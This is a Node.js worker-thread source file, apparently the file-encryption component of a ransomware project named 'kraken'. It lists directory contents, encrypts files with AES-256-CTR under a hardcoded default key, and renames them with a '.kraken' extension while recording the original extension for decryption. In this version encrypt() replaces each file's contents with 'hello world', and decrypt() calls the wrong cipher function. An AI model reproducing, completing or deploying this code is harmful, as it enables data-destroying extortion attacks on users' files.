// With ❤ by GuttyMora
const {parentPort} = require('worker_threads');
require('dotenv').config();
const fs = require('fs');
const crypto = require('crypto');
const {Buffer} = require('buffer');

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY ?? 'my9t8ehq7rg4ht65fgd0bbe57w98hw03p1qz4';
const ENCRYPTED_FILE_EXTENSION = process.env.ENCRYPTED_FILE_EXTENSION ?? 'kraken';

class FileProcessor {
    constructor() {
        this.algorithm = 'aes-256-ctr';
        this.key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest('base64').substr(0, 32);
    }

    async getFiles(directory = null) {
        console.log('[FileProcessor] - getFiles()');

        const directoryPath = directory ?? process.cwd();
        return await new Promise((resolve, reject) => {
            fs.readdir(directoryPath, async (err, files) => {
                if (err) {
                    console.error('[!] Unable to read directory:', err);
                    reject(null);
                } else {
                    const fileList = [];
                    for (const file of files) {
                        try {
                            const stats = await this.getFileStats(`${directoryPath}\\${file}`);
                            fileList.push({
                                name: file,
                                directoryPath: directoryPath,
                                isDirectory: stats.isDirectory(),
                                stats: stats
                            });
                        } catch (err) {
                            console.error('[!] Error getting stats:', err);
                        }
                    }
                    resolve([directoryPath, fileList]);
                }
            })
        });
    }

    async getFileStats(filePath) {
        return await new Promise((resolve, reject) => {
            fs.stat(filePath, (err, stats) => {
                if (err) {
                    console.error('[!] Unable to get file stats:', err);
                    reject(null);
                } else {
                    resolve(stats);
                }
            })
        });
    }

    async encrypt(file) {
        console.log('[FileProcessor] - encrypt()');

        return await new Promise((resolve, reject) => {
            fs.readFile(`${file.directoryPath}\\${file.name}`, {encoding: 'utf8'}, async (err, data) => {
                if (err) {
                    console.error('[!] Unable to read file:', err);
                    reject(null);
                } else {
                    try {
                        data = Buffer.from('hello world', 'utf8');
                        const extension = (file.name.split('.'))[1];
                        const extensionLength = extension.length;
                        const extensionBuff = Buffer.from(`${extensionLength}${extension}`, 'utf8');
                        // initialization vector
                        const iv = crypto.randomBytes(8).toString('hex');
                        const ivBuffer = Buffer.from(iv);

                        // Create a new cipher using the algorithm, key, and iv
                        const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);

                        // Create the new encrypted buffer
                        const encryptedBuffer = Buffer.concat([ivBuffer, extensionBuff, cipher.update(data), cipher.final()]);

                        const encryptedFileName = this.createFile(`${(file.name.split('.')[0])}.${ENCRYPTED_FILE_EXTENSION}`, encryptedBuffer);
                        resolve(encryptedFileName);
                    } catch (err) {
                        console.error('[!] Unable to encrypt file:', err);
                        reject(err);
                    }
                }
            });
        });
    }

    async decrypt(file) {
        console.log('[FileProcessor] - decrypt()');

        return await new Promise((resolve, reject) => {
            fs.readFile(`${file.directoryPath}\\${file.name}`, {encoding: 'utf8'}, async (err, data) => {
                if (err) {
                    console.error('[!] Unable to read file:', err);
                    reject(null);
                } else {
                    try {
                        const iv = data.slice(0, 16);
                        const extensionLength = parseInt(data.slice(16, 17).toString());
                        const extension = data.slice(17, 17 + extensionLength);
                        const encryptedData = data.slice(17 + extensionLength);

                        // Create a new decipher using the algorithm, key, and iv
                        const decipher = crypto.createCipheriv(this.algorithm, this.key, iv);
                        // Decrypted buffer
                        let decryptedBuffer = Buffer.concat([decipher.update(encryptedData), decipher.final()]);

                        const decryptedFileName = await this.createFile(`${(file.name.split('.')[0])}.${extension.toString()}`, decryptedBuffer);
                        resolve(decryptedFileName);
                    } catch (err) {
                        console.error('[!] Unable to decrypt file:', err);
                        reject(null);
                    }
                }
            });
        });
    }

    createFile(fileName, buffer) {
        console.log('[FileProcessor] - createFile()');

        const fileDescriptor = fs.openSync(fileName, 'w');
        fs.writeSync(fileDescriptor, buffer);

        return fileName;
    }
}

// Listen work thread events
parentPort.on('message', async data => {
    const processor = new FileProcessor();

    switch (data.method) {
        case 'getFiles':
            parentPort.postMessage(await processor.getFiles(data.folder));
            break;
        case 'encrypt':
            parentPort.postMessage(await processor.encrypt(data.file));
            break;
        case 'decrypt':
            parentPort.postMessage(await processor.decrypt(data.file));
            break;
        default:
            console.error('[!] FileProcessor error: Not method defined');
    }
});

module.exports = FileProcessor;
